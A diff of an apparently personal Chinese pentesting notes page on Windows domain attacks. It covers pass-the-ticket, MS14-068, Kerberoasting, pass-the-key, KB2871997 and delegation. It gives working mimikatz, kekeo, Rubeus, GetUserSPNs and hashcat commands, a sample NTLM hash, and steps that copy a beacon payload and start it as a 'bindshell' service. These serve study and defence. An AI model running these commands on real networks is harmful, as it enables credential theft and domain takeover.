@@ -202,6 +202,17 @@
         <li><a href="#利用低速密码枚举手段横向">利用低速密码枚举手段横向</a></li>
         <li><a href="#读取内存后无法获取明文密码时的解决思路">读取内存后无法获取明文密码时的解决思路：</a></li>
         <li><a href="#票据传递ptt">票据传递（PTT）</a></li>
+        <li><a href="#利用ms14-068漏洞进行票据传递">利用MS14-068漏洞进行票据传递</a></li>
+        <li><a href="#利用ntml-hash生成票据">利用NTML-hash生成票据</a></li>
+        <li><a href="#从机器历史缓存提取tgt票据并重新认证">从机器历史缓存提取TGT票据，并重新认证</a></li>
+        <li><a href="#kerberoasting攻击">Kerberoasting攻击</a></li>
+        <li><a href="#密钥传递攻击ptk">密钥传递攻击（PTK）</a></li>
+        <li><a href="#kb2871997补丁对域环境的影响">KB2871997补丁对域环境的影响</a></li>
+        <li><a href="#委派">委派</a></li>
+        <li><a href="#非约束委派攻击">非约束委派攻击</a></li>
+        <li><a href="#约束委派攻击-有点复杂还没有捋顺">约束委派攻击 (有点复杂，还没有捋顺)</a></li>
+        <li><a href="#关于约束和非约束委派的思考">关于约束和非约束委派的思考</a></li>
+        <li><a href="#资源约束委派攻击">资源约束委派攻击</a></li>
       </ul>
     </li>
     <li><a href="#攻击链梳理">攻击链梳理</a></li>
@@ -733,7 +744,8 @@ RDP横向
 <h3 id="票据传递ptt">
 <a class="header-anchor" href="#%e7%a5%a8%e6%8d%ae%e4%bc%a0%e9%80%92ptt"></a>
 票据传递（PTT）
-</h3><p>​	票据传递使用场景：</p>
+</h3><p>​	这是一种将窃取的 NTLM 哈希或 AES 密钥转换为 Kerberos 票据，从而在 Kerberos 优先的环境中实现横向移动的攻击技术。其核心是 “升级”凭据，从仅能用于 NTLM 认证的哈希，升级为功能更全的 Kerberos TGT</p>
+<p>​	票据传递使用场景：</p>
 <ul>
 <li>无法获得明文口令，且无法使用hash进行传递攻击（内网内无重复密码的账户）</li>
 <li>PTH可利用的端口或服务未启用或被防火墙拦截。（WMI、SMB、DCOM、RDP、WINRM等）</li>
@@ -747,10 +759,10 @@ RDP横向
 <li>机器历史缓存票据</li>
 <li>加密类型可爆破</li>
 </ul>
-<h4 id="利用ms14-068漏洞进行票据传递">
+<h3 id="利用ms14-068漏洞进行票据传递">
 <a class="header-anchor" href="#%e5%88%a9%e7%94%a8ms14-068%e6%bc%8f%e6%b4%9e%e8%bf%9b%e8%a1%8c%e7%a5%a8%e6%8d%ae%e4%bc%a0%e9%80%92"></a>
 利用MS14-068漏洞进行票据传递
-</h4><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">介绍：
+</h3><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">介绍：
 </span></span><span class="line"><span class="cl">	MS14-068是密钥分发中心（KDC）服务中的Windows漏洞。它允许经过身份验证的用户在其Kerberos票证（TGT）中插入任意PAC。该漏洞位于kdcsvc.dll域控制器的密钥分发中心(KDC)中。用户可以通过呈现具有改变的PAC的Kerberos TGT来获得票证。允许攻击者将域内任意用户权限提升至*域管理级别*。
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">影响版本：
@@ -787,53 +799,513 @@ RDP横向
 </span></span><span class="line"><span class="cl">    copy beacon.exe \\OWA2010CN-GOD\C$
 </span></span><span class="line"><span class="cl">    sc \\OWA2010CN-GOD create bindshell binpath= &#34;c:\beacon.exe&#34;
 </span></span><span class="line"><span class="cl">    sc \\OWA2010CN-GOD start bindshell
-</span></span></code></pre></div><h4 id="利用ntml-hash生成票据">
+</span></span></code></pre></div><h3 id="利用ntml-hash生成票据">
 <a class="header-anchor" href="#%e5%88%a9%e7%94%a8ntml-hash%e7%94%9f%e6%88%90%e7%a5%a8%e6%8d%ae"></a>
 利用NTML-hash生成票据
-</h4><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">条件：
+</h3><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">特点：
+</span></span><span class="line"><span class="cl">	1.无需管理员权限，只要有NTLM_hash，通过普通域内账户就可以实现票据生成和导入。
+</span></span><span class="line"><span class="cl">条件：
 </span></span><span class="line"><span class="cl">	1.需具备NTML-hash。
-</span></span><span class="line"><span class="cl">	2.需具备管理员权限，涉及票据导入
-</span></span><span class="line"><span class="cl">	3.由于涉及票据，用户范围仅限域内用户，本地administrator无法使用此方式。
+</span></span><span class="line"><span class="cl">	2.由于涉及票据，生成票据时需要与域控通信，所以用户范围仅限域内用户，本地账户，如administrator，无法使用此方式。
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">步骤：
 </span></span><span class="line"><span class="cl">    生成票据：shell kekeo &#34;tgt::ask /user:Administrator /domain:god.org /ntlm:ccef208c6485269c20db2cad21734fe7&#34; &#34;exit&#34;
 </span></span><span class="line"><span class="cl">    导入票据：shell kekeo &#34;kerberos::ptt TGT_Administrator@GOD.ORG_krbtgt~god.org@GOD.ORG.kirbi&#34; &#34;exit&#34;
 </span></span><span class="line"><span class="cl">    查看票据：shell klist
 </span></span><span class="line"><span class="cl">    利用票据连接：shell dir \\owa2010cn-god\c$
-</span></span></code></pre></div><h4 id="从机器历史缓存提取tgt票据并重新认证">
+</span></span></code></pre></div><h3 id="从机器历史缓存提取tgt票据并重新认证">
 <a class="header-anchor" href="#%e4%bb%8e%e6%9c%ba%e5%99%a8%e5%8e%86%e5%8f%b2%e7%bc%93%e5%ad%98%e6%8f%90%e5%8f%96tgt%e7%a5%a8%e6%8d%ae%e5%b9%b6%e9%87%8d%e6%96%b0%e8%ae%a4%e8%af%81"></a>
 从机器历史缓存提取TGT票据，并重新认证
-</h4><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="err">为什么会缓存票据：</span>
+</h3><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="err">为什么会缓存票据：</span>
 </span></span><span class="line"><span class="cl">	<span class="err">域内机器进行认证操作时，会优先采用</span><span class="n">Kerberos认证</span><span class="err">，因此必定会在本机产生</span><span class="n">TGT票据缓存</span><span class="err">。</span>
 </span></span><span class="line"><span class="cl"><span class="err">条件：</span>
-</span></span><span class="line"><span class="cl">	<span class="mf">1.</span><span class="err">有管理员权限</span>
-</span></span><span class="line"><span class="cl">	<span class="mf">2.</span><span class="err">最近有过其他账户登录本机</span>
+</span></span><span class="line"><span class="cl">	<span class="mf">1.</span><span class="err">有本地管理员权限。（本地管理员、</span><span class="n">SYSTEM账户可以获取所有账户票据缓存</span><span class="err">，域内账户由于受到票据缓存隔离的影响，仅可获取自身账户的票据）</span>
+</span></span><span class="line"><span class="cl">	<span class="mf">2.</span><span class="err">最近有过其他账户登录本机。</span>
 </span></span><span class="line"><span class="cl">	<span class="mf">3.</span><span class="err">票据还在有效期内（默认</span><span class="mi">10</span><span class="err">小时）</span><span class="o">-</span><span class="err">这条很苛刻。</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="err">利用：</span>
 </span></span><span class="line"><span class="cl">    <span class="err">导出票据：</span>
 </span></span><span class="line"><span class="cl">        <span class="n">mimikatz</span> <span class="n">sekurlsa</span><span class="p">::</span><span class="n">tickets</span> <span class="o">/</span><span class="k">export</span>  <span class="err">（需要管理员权限）</span>
-</span></span><span class="line"><span class="cl">    <span class="err">清楚多余票据：</span><span class="n">shell</span> <span class="n">klist</span> <span class="n">purge</span>   <span class="err">（排除干扰）</span>
+</span></span><span class="line"><span class="cl">    <span class="err">清楚多余票据：</span><span class="n">shell</span> <span class="n">klist</span> <span class="n">purge</span>   <span class="err">（排除其余票据干扰，否则肯不会优先使用导入的票据）</span>
 </span></span><span class="line"><span class="cl">    <span class="err">导入票据：（普通域内账户可以实现）</span>
 </span></span><span class="line"><span class="cl">   		<span class="n">mimikatz</span> <span class="n">kerberos</span><span class="p">::</span><span class="n">ptt</span> <span class="n">C</span><span class="p">:</span>\<span class="n">Users</span>\<span class="n">webadmin</span>\<span class="n">Desktop</span>\<span class="p">[</span><span class="mi">0</span><span class="p">;</span><span class="mi">22</span><span class="n">d3a</span><span class="p">]</span><span class="o">-</span><span class="mi">2</span><span class="o">-</span><span class="mi">1</span><span class="o">-</span><span class="mf">40e00000</span><span class="o">-</span><span class="n">Administrator</span><span class="err">@</span><span class="n">krbtgt</span><span class="o">-</span><span class="n">god</span><span class="o">.</span><span class="n">org</span><span class="o">.</span><span class="n">kirbi</span>
 </span></span><span class="line"><span class="cl">    <span class="err">查看票据：</span><span class="n">shell</span> <span class="n">klist</span>
 </span></span><span class="line"><span class="cl">    <span class="err">利用票据连接：</span><span class="n">shell</span> <span class="n">dir</span> \\<span class="n">owa2010cn</span><span class="o">-</span><span class="n">god</span>\<span class="n">c</span><span class="o">$</span>
-</span></span></code></pre></div><h4 id="kerberoasting攻击">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="err">疑问点：</span>
+</span></span><span class="line"><span class="cl">	<span class="n">A</span><span class="o">.</span><span class="err">在本机上导出在导入票据有什么意义，是不是多此一举？</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="err">补充知识点：</span>
+</span></span><span class="line"><span class="cl">	<span class="err">所有用户的</span> <span class="n">Kerberos</span> <span class="err">票据，最终都存储在系统的一个核心进程</span> <span class="n">lsass</span><span class="o">.</span><span class="n">exe的内存中</span><span class="err">。该进程为每个用户会话（</span><span class="n">Session</span><span class="err">）建立了独立的</span> <span class="n">Kerberos</span> <span class="err">缓存空间</span><span class="o">------</span><span class="n">kerberos缓存隔离</span> <span class="p">(</span><span class="err">当前域内账户仅能看到和使用自身的缓存票据，看不到其他账户的缓存票据</span><span class="p">)</span><span class="err">。</span>
+</span></span><span class="line"><span class="cl">	<span class="err">本地</span> <span class="n">Administrator</span><span class="o">/</span><span class="n">SYSTEM</span><span class="err">：在</span> <span class="n">Windows</span> <span class="err">的权限模型中，本地最高权限凌驾于一切用户会话之上。它拥有</span> <span class="n">SeDebugPrivilege</span><span class="err">（调试权限），这意味着它可以强行翻开</span> <span class="n">lsass</span><span class="o">.</span><span class="n">exe的</span><span class="err">“内存账本”，无视任何会话隔离。因此可以打破隔离，看到并窃取这台机器上所有域内账户的票据。</span>
+</span></span><span class="line"><span class="cl">	<span class="err">因为以上的原因，所以即使在本机中，也需要进行导出（从本地</span><span class="n">administartor中的缓存导出</span><span class="err">）再导入（到入至域内账户缓存）的操作。这就解释了疑问点</span><span class="n">A</span><span class="err">。</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="err">扩展：可以在</span><span class="n">A机器导出缓存</span><span class="err">，在</span><span class="n">B机器上导入并使用</span><span class="err">。</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="err">优势：因为这种攻击方式，是由</span> <span class="err">域内的</span><span class="n">A账户</span> <span class="err">使用</span> <span class="err">域内的</span><span class="n">B账户</span> <span class="err">或</span> <span class="err">域内管理员</span> <span class="err">的票据，因此可以隐藏攻击账户的身份。</span>
+</span></span></code></pre></div><h3 id="kerberoasting攻击">
 <a class="header-anchor" href="#kerberoasting%e6%94%bb%e5%87%bb"></a>
 Kerberoasting攻击
-</h4><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">条件：
-</span></span><span class="line"><span class="cl">	在 &#34;域控机器-本地安全策略-本地策略-安全选项-配置kerberos允许的加密类型&#34; 设置 &#34;RC4_HMAC_MD5&#34; 加密算法。
+</h3><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">本质是破解服务账户的密码。
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">*条件：
+</span></span><span class="line"><span class="cl">	1.在 &#34;域控机器-本地安全策略-本地策略-安全选项-配置kerberos允许的加密类型&#34; 设置 &#34;RC4_HMAC_MD5&#34; 加密算法。
+</span></span><span class="line"><span class="cl">	2.服务账户做好使用弱密码。目标的 服务账户 不能是托管服务账户（托管服务账户的密码是随机生成的240字节长度，根本难以破解）
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">*攻击过程：（过程分为：发现RC4加密的票据------&gt; 导出票据 或 票据的hash -------&gt; 破解）
+</span></span><span class="line"><span class="cl">		手动枚举的方式：
+</span></span><span class="line"><span class="cl">			1.powershell setspn -T [域名] -q */*   #枚举指定域的所有SPN  
+</span></span><span class="line"><span class="cl">			2.mimikatz kerberos::ask /target:MSSQLSvc/SqlServer.god.org:1433   #使用mimikatz工具，在/target参数后指定SPN名，主动请求该服务，获取ST票据。
+</span></span><span class="line"><span class="cl">			或者使用powershell原生命令请求票据：
+</span></span><span class="line"><span class="cl">				Add-Type -AssemblyName System.IdentityModel 
+</span></span><span class="line"><span class="cl">				New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList &#39;[spn名]&#39;
+</span></span><span class="line"><span class="cl">			3.klist  # 查看缓存列表，找到刚才请求的票据，&#34;查看对应ST kerberos票证加密类型&#34;  是否显示&#34;RC4***&#34;。
+</span></span><span class="line"><span class="cl">			4.mimikatz kerberos::list /export   # 使用mimikatz导出票据
+</span></span><span class="line"><span class="cl">			5.python tgsrepcrack.py pass.txt &#34;xx.kirbi&#34;  使用py脚本破解，pass.txt是密码字典。
+</span></span><span class="line"><span class="cl">		
+</span></span><span class="line"><span class="cl">		工具自动化的方式：(这里工具生成的是hash，而不是上面.kirbi文件)
+</span></span><span class="line"><span class="cl">			1. Rubeus kerberoast   #自动检测域内SPN是否存在RC4加密的票据。（rubeus需要放到目标机器上，考虑免杀）
+</span></span><span class="line"><span class="cl">			或者使用  python GetUserSPNs.py -request -dc-ip [域控IP] [域名]/[域内账户]:[密码] -outputfile hash.txt      #也是自动检测。(该工具一般在攻击机上，所以需要建好socket节点访问目标机，而且需要指定账户、密码、域控信息等)
+</span></span><span class="line"><span class="cl">			2.hashcat -m 13100 hash.txt pass.txt --force   #依旧破解
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">*现状：（即将过时的攻击手段）
+</span></span><span class="line"><span class="cl">	目前只有Windows 7 / Server 2008 R2 及更早版本默认使用“RC4_HMAC_MD5”加密算法。
+</span></span><span class="line"><span class="cl">	Windows 11 23H2 及更高版本，或加入了现代域的 Windows Server 2016/2019/2022），域内 Kerberos 认证的默认主力算法是：AES256-CTS-HMAC-SHA1-96 (通常作为最高优先级的默认选择) 和 AES128-CTS-HMAC-SHA1-96。
+</span></span><span class="line"><span class="cl">	AES算法优势：安全性碾压：相比于 RC4 和 DES，AES 算法至今没有被实用化的数学破解方法，抗暴力破解能力极强。内置加盐机制：在 Kerberos 使用 AES 加密时，它会结合用户的密码哈希和一个随机生成的盐值（Salt）来衍生密钥。这意味着，即使两个用户的密码完全相同，由于盐值不同，他们最终用于 Kerberos 加密的密钥也完全不同。这直接封堵了过去利用 RC4 进行大规模离线撞库（如Kerberoasting）的捷径。
+</span></span><span class="line"><span class="cl">	尽管 AES 是默认标准，但在过去几年里，为了兼容老旧的打印机、NAS 设备或上古级别的 Windows 7 系统，很多企业域内依然悄悄保留着 RC4-HMAC-MD5作为降级备选。
+</span></span><span class="line"><span class="cl">    但是，这种情况在 2026 年发生了剧变。
+</span></span><span class="line"><span class="cl">    微软为了彻底根除 RC4 带来的安全隐患（如我们之前讨论的 Kerberoasting），在 2026 年 1 月的累积更新中启动了一个“杀手锏”计划：
+</span></span><span class="line"><span class="cl">    2026年1月更新：域控制器（DC）开始默认移除 RC4 作为“假定加密类型”，并增加了 RC4 使用审计日志。
+</span></span><span class="line"><span class="cl">    2026年4月更新：进入“强制阻断模式”，默认直接拦截通过 RC4 申请的票据。
+</span></span><span class="line"><span class="cl">    2026年7月更新：彻底锁死，连回退到审计模式的选项都将消失。
+</span></span><span class="line"><span class="cl">    结论：现在如果你的域内还有系统试图用 RC4 进行认证，不仅不会成功，还会在域控的安全日志里触发高频警报。
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">*漏洞产生原因：
+</span></span><span class="line"><span class="cl">	在 Kerberos 协议中，当用户想要访问某个服务（比如 SQLService或 HTTP）时，需要先向域控（KDC）申请一张服务票据（TGS）。域控在发放这张票据时，会用目标服务账户的密码哈希（Hash）来对票据进行加密。
+</span></span><span class="line"><span class="cl">	在 Kerberos 的 RC4-HMAC 加密模式中，用于加密票据的密钥（K1）是直接由服务账户的 NTLM Hash派生出来的。而且很多管理员在配置服务账户（如 SQL 服务、IIS 服务）时，为了方便记忆，往往设置得非常简陋（比如 Password123!、SQL2019等）。因为加密密钥的熵值完全依赖于这个“弱密码”，再加上 RC4 极快的运算速度，攻击者拿着从域控轻易申请来的“加密票据”，就可以在本地毫无阻碍地狂轰滥炸。
+</span></span><span class="line"><span class="cl">	RC4算法是一种流密码，算法逻辑简单轻量，运算速度快，同意的时间AES只能枚举万次，而RC4可以枚举百万次甚至千万次。
+</span></span><span class="line"><span class="cl">	
+</span></span><span class="line"><span class="cl">	
+</span></span><span class="line"><span class="cl">*Kerberoasting 的攻击链路如下：
+</span></span><span class="line"><span class="cl">	1.侦察：攻击者作为普通域用户，不需要任何特殊权限，只需在域内发起 LDAP 查询，找到所有注册了 ServicePrincipalName (SPN)的账户（这些通常是运行各种服务的账户）。
+</span></span><span class="line"><span class="cl">	2.请求票据：为这些服务账户申请服务票据（TGS-REP）。
+</span></span><span class="line"><span class="cl">	3.提取密文：从返回的票据中，提取出被服务账户密码加密的密文块。
+</span></span><span class="line"><span class="cl">	4.离线破解：将提取出的密文拿到自己的高性能服务器上，使用字典进行离线暴力破解。
+</span></span></code></pre></div><h3 id="密钥传递攻击ptk">
+<a class="header-anchor" href="#%e5%af%86%e9%92%a5%e4%bc%a0%e9%80%92%e6%94%bb%e5%87%bbptk"></a>
+密钥传递攻击（PTK）
+</h3><p>简单理解，本质上和哈希传递攻击手法一样，只是将NTLMhash换成AES密钥。</p>
+<p>攻击利用方式：（基本等同PTH）</p>
+<ul>
+<li>
+<p>第一步：mimikatz sekurlsa::ekeys   #查看本机进程 <code>lsass.exe</code>中的 <code>aes256_hmac</code>密钥。</p>
+</li>
+<li>
+<p>第二步：mimikatz sekurlsa::pth /user:域用户名 /domain:域名或IP /aes256:aes256值     #Mimikatz 接收到指令，它不会去连远程机器的 SMB 端口（那是 NTLM 干的事），而是直接向域控（KDC）发起 <strong>Kerberos AS-REQ 请求</strong>。</p>
+</li>
+</ul>
+<p>PTK = Pass The Key，当系统安装了KB2871997补丁且禁用NTLM的时候，</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">PTK应用场景的极端前置条件：
+</span></span><span class="line"><span class="cl">	A.域环境中一切认证优先去使用kerberos认证，NTLM认证只是一种降级认证的手段，而传统的PTH正是基于NTLM认证实现的。所以一旦彻底进行NTLM认证，域内的PTH手段会失效。	
+</span></span><span class="line"><span class="cl">	关闭NTLM认证的设置：进入组策略----&gt;计算机配置-&gt; 策略-&gt; Windows 设置-&gt; 安全设置-&gt; 本地策略-&gt; 安全选项,找到 网络安全性: 基于 NTLM 的服务器身份验证(Network security: Restrict NTLM: Incoming NTLM traffic`)。将其设置为 拒绝所有账户(Deny all accounts)。
+</span></span><span class="line"><span class="cl">	
+</span></span><span class="line"><span class="cl">	B.还没完：以为只要禁用了 NTLM，攻击者就拿不到 Hash 了。其实不然。在默认的 Kerberos 通信中，为了兼容老系统（如 Windows XP/2003），域控默认依然支持 RC4_HMAC_MD5加密算法。而在 Kerberos 体系中，RC4算法使用的密钥，恰恰就是你熟悉的 NTLM Hash 如果放任 RC4 开启，攻击者依然可以通过请求 Kerberos 票据（AS-REQ）来获取用户的 NTLM Hash（即 Kerberoasting 攻击）。
+</span></span><span class="line"><span class="cl">因此，要强制系统只认 AES，必须精准剔除其他加密算法。
+</span></span><span class="line"><span class="cl">	关闭RC4算法：参考 “Kerberoasting 攻击 ” 内容。
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">以上为极端场景，大部分情况下会因为考虑到老旧系统的兼容，不会完全封死。
+</span></span><span class="line"><span class="cl">但可以思考下极端场景下，可用的攻击手段：
+</span></span><span class="line"><span class="cl">	1. PTT：票据传递的手段依然可用。Kerberoasting肯定废了
+</span></span><span class="line"><span class="cl">	2. PTK：提取 aes256_hmac密钥，进行密钥传递攻击。
+</span></span><span class="line"><span class="cl">	3.本地账户间的PTH：只是禁用域内的NTLM，但本机administartor账户不在域内，所以依然可以使用PTH横向。
+</span></span><span class="line"><span class="cl">	
+</span></span><span class="line"><span class="cl">	
+</span></span></code></pre></div><h3 id="kb2871997补丁对域环境的影响">
+<a class="header-anchor" href="#kb2871997%e8%a1%a5%e4%b8%81%e5%af%b9%e5%9f%9f%e7%8e%af%e5%a2%83%e7%9a%84%e5%bd%b1%e5%93%8d"></a>
+KB2871997补丁对域环境的影响
+</h3><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">安装 KB2871997​ 补丁是 Windows 安全演进史上的一个重要分水岭。在渗透测试和内网攻防的语境下，这个补丁的主要目的是“提高凭据保护能力，遏制横向移动”。
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">它对系统环境和攻击手法产生了多维度的深远影响，我们可以从“防守收益”和“攻击受限”两个视角来拆解，同时澄清一个业内流传已久的“大误解”。
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">🛡️ 一、 对系统的核心影响（防守视角）
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">从系统底层和安全机制来看，KB2871997 带来了四项至关重要的安全加固：
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">1. 阻断内存中的“明文密码泄露”
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">在早期的 Windows 系统中，用户输入密码登录后，系统为了支持某些旧的认证协议（如 WDigest），会习惯性地把明文密码留在内存（lsass.exe进程）中。这就导致只要黑客提权成功，用 Mimikatz 敲一行命令就能把密码明文扒出来。
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">打了补丁后的变化：除了 WDigest 协议（需手动配置禁用），系统默认不再在任何环节存储明文密码。这意味着，想直接从内存中 sekurlsa::logonpasswords摘取密码的时代一去不返了。
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">2. 引入“受保护用户组”（Protected Users）
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">补丁新增了一个特殊的 Active Directory 安全组——Protected Users。
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">打了补丁后的变化：只要把高权限账号（如域管理员）拉进这个组，系统就会强制对该用户应用最高安全标准：比如禁止使用 NTLM 认证、禁止使用 Kerberos 的弱加密算法（如 DES 和 RC4）、并强制要求在登录时使用智能卡或生物识别等多因素认证。这从根本上废掉了针对这些账号的多数凭据窃取和复用攻击。
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">3. 增设“本地账号”动态墙
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">为了方便管理员阻断本地账号的网络登录，补丁在系统底层悄悄创建了两个不同的“隐形组别”：
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">LOCAL_ACCOUNT（所有本地账号）
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">LOCAL_ACCOUNT_AND_MEMBER_OF_ADMINISTRATORS_GROUP（属于本地管理员组的本地账号）
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">打了补丁后的变化：管理员可以通过组策略的“拒绝从网络访问这台计算机”功能，精准一键封杀所有本地账号的远程登录权限，从而切断黑客拿着本地管理员哈希在内网乱撞的横向移动路径。
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">4. 开启“受限管理模式”的远程桌面（Restricted Admin RDP）
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">打了补丁后的变化：系统开始支持一种特殊的远程桌面连接方式——Mstsc.exe /restrictedadmin。在这种模式下，你不需要知道目标用户的明文密码，而是直接使用当前机器的凭据或票据进行 RDP 登录。这不仅方便了运维排障，也避免了在跳转机上留下新的凭据痕迹。
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">⚔️ 二、 对渗透测试/黑客手法的影响（攻击视角）
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">对于拿下一台机器后准备在内网“横向起飞”的黑客来说，KB2871997 就像是一道升高的围墙：
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">1. 传统的“万能哈希传递”被泼了冷水
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">在打这个补丁之前，只要拿到了管理员的 NTLM Hash，就可以肆无忌惮地在内网进行 Pass-the-Hash（哈希传递）攻击。
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">打了补丁后的变化：由于补丁加强了对本地账户的管控，黑客在使用非默认的本地管理员哈希进行 Pth 时，会发现无法连接远程主机的文件共享（SMB），也无法通过 WMI 或 PsExec 执行命令。
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">2. 逼迫攻击者走向“高级协议”和“高级密钥”
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">当 NTLM 相关的利用受阻后，黑客的攻击链路被迫发生偏转：
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">转向 Kerberos 体系：既然 NTLM 走不通，那就转而去请求 Kerberos 票据（AS-REQ），这就催生了诸如 Kerberoasting（爆破服务票据）或直接使用 AES Key 进行 PTK（Pass-the-Key）​ 的攻击手法。
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">死磕默认管理员（SID 500）：补丁留了一个“后门”——默认的 Administrator 账号（其 SID 结尾必定是 -500）依然可以进行哈希传递。因此在实战中，黑客会变得对 SID=500的账号极其敏感。
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">💣 三、 业内最大的误解：非500账号不能PTH到底怪谁？
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">这里有一个在渗透圈流传了很久的误区：很多人认为“打了 KB2871997 后，非 RID 500 的本地管理员就不能 PTH 了，这都是补丁的功劳”。
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">真相是：这口锅不该 KB2871997 一个人背。
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">真正在幕后发挥作用的是 Windows 的 UAC（用户账户控制）机制。
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">当非 RID 500 的本地管理员尝试通过网络进行远程认证（比如 PTH）时，UAC 会觉得“这人我不认识”或者“权限不够”，从而剥离掉该网络令牌的管理员权限（即所谓的 Admin Approval Mode）。因为缺乏足够的权限，自然就无法远程连接了。
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">如果你在一台未打 KB2871997 的机器上，把注册表 LocalAccountTokenFilterPolicy设为 1，非500账号依然可以 PTH。
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">反之，即便打了 KB2871997，只要目标主机上的 UAC 被关闭或注册表被修改，非500账号照样能打。
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">💡 总结与启示
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">KB2871997 并没有从根本上“杀死”哈希传递或内网渗透，它的真正作用是大幅度拉高了攻击者的作案成本，并逼着攻击者的 TTP（战术、技术和过程）向更高级演进。
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">对于企业防守方而言，仅仅打上这个补丁是远远不够的，更需要配合禁用 WDigest 明文缓存、将高权限账号加入 Protected Users 组、以及严格限制本地管理员的内网横向移动权限，才能真正发挥这颗补丁的最大价值。
+</span></span></code></pre></div><h3 id="委派">
+<a class="header-anchor" href="#%e5%a7%94%e6%b4%be"></a>
+委派
+</h3><p>​		委派是一种域内应用模式，是指将域内用户账户的权限委派给服务账号，服务账号因此能以用户的身份在域内展开活动（请求新的服务等）。</p>
+<p>​		考虑这个场景：用户访问一个Web应用，Web应用需要以该用户的身份去访问后端SQL数据库。问题来了——Web服务器如何代表用户去认证SQL服务器？Kerberos委派就是解决这个问题的机制：允许一个服务&quot;代表&quot;用户去访问另一个服务。</p>
+<p>​		设置委派时需要在服务账户设置委派。</p>
+<p>​	委派场景：</p>
+<p>​			用户 → Web服务器 → （以用户身份）→ SQL数据库</p>
+<p>​					            ↑ 这里需要委派</p>
+<p>​		域委派分类：</p>
+<p>​			1、非约束委派(Unconstrained Delegation, UD) ：指用户账户将自身的TGT转发给服务账户使用</p>
+<p>​			2、约束委派(Constrained Delegation, CD) ：通过S4U2Self和S4U2Proxy两个扩展协议限制服务账户只能访问指定服务资源</p>
+<p>​			3、基于资源的约束委派(Resource Based Constrained Delegation) ：委派的管理移交给服务资源进行控制</p>
+<p>​		账户分类：</p>
+<p>​			机器账户：计算机本身名称的账户，在域中computers组内的计算机。</p>
+<p>​			主机账户：计算机系统的主机账户，用于正常用户登入计算机使用。</p>
+<p>​			服务账户：计算机服务安装时创建的账户，运行服务时使用，不可登入计算机。</p>
+<h3 id="非约束委派攻击">
